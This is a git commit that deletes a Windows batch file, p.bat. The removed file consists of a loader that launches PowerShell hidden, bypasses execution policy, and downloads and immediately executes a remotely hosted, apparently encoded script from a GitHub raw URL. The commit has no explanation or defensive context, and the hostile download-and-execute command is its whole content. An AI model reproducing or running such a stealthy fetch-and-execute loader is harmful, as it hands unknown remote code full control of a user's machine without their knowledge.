710f1c61ea099c927e0d617dcac795677d7f919b
allisonmorat <allisonmorat@proton.me>
2025-11-20 16:29:20 +0000

    Delete p.bat

--- p.bat
+++
@@ -1,7 +0,0 @@
-@echo off
-setlocal
-
-powershell -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/allisonmorat/three/main/encoded_p.ps1' -UseBasicParsing).Content"
-
-endlocal
-exit
